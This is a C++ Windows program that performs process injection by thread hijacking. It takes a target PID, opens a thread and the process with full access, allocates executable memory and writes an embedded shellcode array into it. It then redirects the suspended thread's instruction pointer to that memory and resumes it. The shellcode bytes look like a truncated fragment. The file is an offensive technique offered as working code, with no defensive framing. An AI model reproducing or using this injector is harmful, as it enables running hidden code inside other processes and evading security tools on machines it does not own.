#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <WtsApi32.h>
#pragma comment(lib, "WtsApi32.lib")

using namespace std;

void LogHex(const string& message, PVOID value) {
    cout << "[+] " << message << ": 0x" << hex << uppercase << (uintptr_t)value << nouppercase << dec << endl;
}

unsigned char shellcode[] =
    "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
    "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

HANDLE findThread(DWORD pid) {
    HANDLE hSnapshot;
    THREADENTRY32 tEntry;
    HANDLE hThread;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    tEntry.dwSize = sizeof(tEntry);

    while (Thread32Next(hSnapshot, &tEntry)) {
        if (tEntry.th32OwnerProcessID == pid) {
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tEntry.th32ThreadID);
            if (hThread == NULL || tEntry.th32ThreadID == 0) {
                continue;
            }
            else {
                LogHex("Thread handle found", hThread);
                return hThread;
            }
        }
    }
    return NULL;
}

HANDLE getHandleProcessByPID(DWORD pid) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pEntry;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pEntry.dwSize = sizeof(pEntry);
    HANDLE hProcess = NULL;

    while (Process32Next(hSnapshot, &pEntry)) {
        if (pEntry.th32ProcessID == pid) {
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pEntry.th32ProcessID);
            if (hProcess == NULL || pEntry.th32ProcessID == 0) {
                continue;
            }
            else {
                LogHex("Process handle obtained", hProcess);
                return hProcess;
            }
        }
    }
    return NULL;
}

CONTEXT getThreatContext(HANDLE hThread) {
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    SuspendThread(hThread);
    GetThreadContext(hThread, &context);
    LogHex("Thread context obtained", (PVOID)context.Rip);
    return context;
}

int main() {
    HANDLE hThread;
    CONTEXT context;
    DWORD pid;

    cout << "Enter the PID of the target process: ";
    cin >> pid;

    if (pid == 0) {
        cerr << "[!] Invalid PID provided." << endl;
        return 1;
    }

    hThread = findThread(pid);
    if (hThread == NULL) {
        cerr << "[!] Could not find a thread for the process with PID: " << pid << "." << endl;
        return 1;
    }

    context = getThreatContext(hThread);
    HANDLE hProcess = NULL;
    hProcess = getHandleProcessByPID(pid);

    if (hProcess == NULL) {
        cerr << "[!] Could not get a handle to the process with PID: " << pid << "." << endl;
        return 1;
    }

    LPVOID mSpace = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (mSpace == NULL) {
        cerr << "[!] Could not allocate memory in the target process." << endl;
        return 1;
    }
    LogHex("Memory allocated in target process", mSpace);

    if (!WriteProcessMemory(hProcess, mSpace, shellcode, sizeof(shellcode), NULL)) {
        cerr << "[!] Failed to write the code into the target process." << endl;
        return 1;
    }
    cout << "[+] Shellcode written to target process memory." << endl;

    context.Rip = (DWORD_PTR)mSpace;
    SetThreadContext(hThread, &context);
    ResumeThread(hThread);
    LogHex("Thread resumed at", mSpace);

    cout << "[+] Execution successful!" << endl;

    return 0;
}
